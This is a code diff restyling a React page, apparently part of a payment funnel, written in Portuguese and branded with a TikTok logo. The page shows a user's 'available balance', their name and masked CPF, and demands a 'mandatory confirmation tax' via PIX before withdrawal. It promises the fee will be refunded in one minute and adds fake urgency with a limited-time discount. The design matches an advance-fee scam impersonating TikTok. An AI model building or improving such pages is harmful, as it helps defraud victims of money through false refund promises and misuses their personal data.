@@ -72,68 +72,71 @@ const FunnelConfirmTax = ({
         <img src={tiktokLogo} alt="TikTok" className="h-6 w-auto" />
       </div>
 
-      <main className="px-3 py-2.5 space-y-2.5 max-w-md mx-auto pb-6">
-        <div className="bg-black rounded-xl p-4">
-          <p className="text-white/90 text-[10px] font-semibold tracking-wider mb-0.5">SALDO DISPONÍVEL</p>
-          <p className="text-white text-[26px] font-extrabold tracking-tight leading-none">{balance}</p>
-          <p className="text-white/80 text-xs mt-1.5">Aguardando confirmação para saque</p>
+      <main className="px-3 py-3 space-y-3 max-w-md mx-auto pb-6">
+        {/* Saldo */}
+        <div className="bg-gradient-to-r from-[#1a1a1a] to-[#2d2d2d] rounded-xl p-5">
+          <p className="text-white/70 text-[10px] font-bold tracking-widest mb-1">SALDO DISPONÍVEL</p>
+          <p className="text-white text-[28px] font-extrabold tracking-tight leading-none">{balance}</p>
+          <p className="text-white/60 text-xs mt-2">Aguardando confirmação para saque</p>
         </div>
 
-        <div className="bg-white rounded-xl p-4 border border-gray-100">
-          <p className="text-gray-500 text-[10px] font-medium tracking-wide mb-3">CONFIRMAÇÃO DE IDENTIDADE</p>
+        {/* Confirmação de identidade */}
+        <div className="bg-white rounded-xl p-4 border border-gray-100 border-l-4 border-l-[#4CAF50]">
+          <p className="text-gray-400 text-[10px] font-semibold tracking-widest mb-3">CONFIRMAÇÃO DE IDENTIDADE</p>
           {leadCpf && (
-            <div className="flex items-center gap-3 mb-3 bg-gray-50 rounded-lg px-3 py-2.5">
-              <div className="w-8 h-8 rounded-full bg-[#FFEBEE] flex items-center justify-center shrink-0"><span className="text-sm">🪪</span></div>
+            <div className="flex items-center gap-3 mb-4 bg-gray-50 rounded-lg px-3 py-3">
+              <div className="w-9 h-9 rounded-full bg-[#FFEBEE] flex items-center justify-center shrink-0"><span className="text-base">🪪</span></div>
               <div className="flex-1 min-w-0">
-                <p className="text-gray-800 text-xs font-semibold truncate">{leadName || "Titular"}</p>
-                <p className="text-gray-400 text-[11px]">CPF: {maskCpf(leadCpf)}</p>
+                <p className="text-gray-800 text-sm font-semibold truncate">{leadName || "Titular"}</p>
+                <p className="text-gray-400 text-xs">CPF: {maskCpf(leadCpf)}</p>
               </div>
-              <Check className="w-4 h-4 text-[#4CAF50] shrink-0" />
+              <Check className="w-5 h-5 text-[#4CAF50] shrink-0" />
             </div>
           )}
           <div className="flex items-center gap-2.5 mb-3">
-            <div className="flex items-baseline gap-2">
-              <span className="text-gray-400 text-sm line-through">{taxAnchor}</span>
-              <span className="text-[#E53935] text-xl font-bold leading-none">{taxAmount}</span>
-            </div>
-            <span className="bg-[#E8F5E9] text-[#4CAF50] text-[10px] font-semibold px-2 py-1 rounded">{taxDiscount}</span>
+            <span className="text-gray-400 text-sm line-through">{taxAnchor}</span>
+            <span className="text-[#E53935] text-2xl font-extrabold leading-none">{taxAmount}</span>
+            <span className="bg-[#E8F5E9] text-[#2E7D32] text-[10px] font-bold px-2 py-1 rounded-md">{taxDiscount}</span>
           </div>
           <div className="bg-[#FFF3E0] border border-orange-200 rounded-lg px-3 py-2 mb-3">
             <p className="text-orange-800 text-[11px] font-semibold">🔥 Promoção por tempo limitado</p>
           </div>
-          <p className="text-gray-500 text-xs leading-relaxed">
+          <p className="text-gray-500 text-[13px] leading-relaxed">
             Taxa obrigatória para liberação do saque no valor de <span className="font-bold text-gray-800">{balance}</span>. O valor de <span className="font-bold text-gray-800">{taxAmount}</span> será reembolsado integralmente para você em 1 minuto.
           </p>
         </div>
 
-        <div className="bg-[#E8F5E9] rounded-xl px-4 py-3 border border-[#C8E6C9] flex items-center gap-3">
-          <div className="w-8 h-8 rounded-full bg-[#4CAF50] flex items-center justify-center shrink-0"><ShieldCheck className="w-4 h-4 text-white" /></div>
+        {/* Reembolso */}
+        <div className="bg-[#E8F5E9] rounded-xl px-4 py-3.5 border border-[#C8E6C9] flex items-center gap-3">
+          <div className="w-9 h-9 rounded-full bg-[#4CAF50] flex items-center justify-center shrink-0"><ShieldCheck className="w-4 h-4 text-white" /></div>
           <div>
-            <p className="text-[#2E7D32] text-xs font-bold">Reembolso garantido em 1 minuto</p>
-            <p className="text-[#388E3C] text-[11px]">Você recebe {taxAmount} de volta automaticamente via PIX</p>
+            <p className="text-[#2E7D32] text-[13px] font-bold">Reembolso garantido em 1 minuto</p>
+            <p className="text-[#388E3C] text-xs">Você recebe {taxAmount} de volta automaticamente via PIX</p>
           </div>
         </div>
 
+        {/* Processo de liberação */}
         {!showPixInline && (
-          <div className="bg-white rounded-xl p-4 border border-gray-100">
-            <p className="text-gray-500 text-[10px] font-medium tracking-wide mb-4">PROCESSO DE LIBERAÇÃO</p>
-            <div className="space-y-4">
+          <div className="bg-white rounded-xl p-4 border border-gray-100 border-l-4 border-l-gray-200">
+            <p className="text-gray-400 text-[10px] font-semibold tracking-widest mb-4">PROCESSO DE LIBERAÇÃO</p>
+            <div className="space-y-5">
               <div className="flex items-start gap-3">
-                <div className="w-7 h-7 rounded-full bg-[#FFEBEE] flex items-center justify-center shrink-0"><span className="text-[#E57373] text-xs font-semibold">1</span></div>
-                <div className="pt-0.5"><p className="text-gray-800 text-[13px] font-semibold leading-tight">Pagar taxa de confirmação</p><p className="text-gray-400 text-[11px] mt-0.5">{taxAmount} para verificação de identidade</p></div>
+                <div className="w-8 h-8 rounded-full bg-[#FFEBEE] flex items-center justify-center shrink-0"><span className="text-[#E57373] text-xs font-bold">1</span></div>
+                <div className="pt-0.5"><p className="text-gray-800 text-sm font-semibold leading-tight">Pagar taxa de confirmação</p><p className="text-gray-400 text-xs mt-0.5">{taxAmount} para verificação de identidade</p></div>
               </div>
               <div className="flex items-start gap-3">
-                <div className="w-7 h-7 rounded-full bg-[#E8F5E9] flex items-center justify-center shrink-0"><Check className="w-3.5 h-3.5 text-[#4CAF50]" /></div>
-                <div className="pt-0.5"><p className="text-[#4CAF50] text-[13px] font-semibold leading-tight">Receber reembolso automático</p><p className="text-gray-400 text-[11px] mt-0.5">Valor devolvido em 1 minuto</p></div>
+                <div className="w-8 h-8 rounded-full bg-[#E8F5E9] flex items-center justify-center shrink-0"><Check className="w-4 h-4 text-[#4CAF50]" /></div>
+                <div className="pt-0.5"><p className="text-[#4CAF50] text-sm font-semibold leading-tight">Receber reembolso automático</p><p className="text-gray-400 text-xs mt-0.5">Valor devolvido em 1 minuto</p></div>
               </div>
               <div className="flex items-start gap-3">
-                <div className="w-7 h-7 rounded-full bg-gray-100 flex items-center justify-center shrink-0"><span className="text-gray-400 text-xs font-semibold">3</span></div>
-                <div className="pt-0.5"><p className="text-gray-800 text-[13px] font-semibold leading-tight">Acessar saldo completo</p><p className="text-gray-400 text-[11px] mt-0.5">{balance} liberado para saque</p></div>
+                <div className="w-8 h-8 rounded-full bg-gray-100 flex items-center justify-center shrink-0"><span className="text-gray-400 text-xs font-bold">3</span></div>
+                <div className="pt-0.5"><p className="text-gray-800 text-sm font-semibold leading-tight">Acessar saldo completo</p><p className="text-gray-400 text-xs mt-0.5">{balance} liberado para saque</p></div>
               </div>
             </div>
           </div>
         )}
 
+        {/* CTA */}
         <button
           onClick={onGeneratePix}
           disabled={isGenerating || showPixInline}
@@ -223,8 +226,8 @@ const FunnelConfirmTax = ({
           </div>
         )}
 
-        <div className="bg-white rounded-xl p-4 border border-gray-100">
-          <p className="text-gray-500 text-[10px] font-medium tracking-wide mb-3">PERGUNTAS FREQUENTES</p>
+        <div className="bg-white rounded-xl p-4 border border-gray-100 border-l-4 border-l-gray-200">
+          <p className="text-gray-400 text-[10px] font-semibold tracking-widest mb-3">PERGUNTAS FREQUENTES</p>
           <div className="space-y-0">
             {[
               { q: "Por que preciso pagar essa taxa?", a: "A taxa é uma verificação de segurança obrigatória para confirmar sua identidade e liberar o saque. O valor é reembolsado automaticamente em até 1 minuto." },
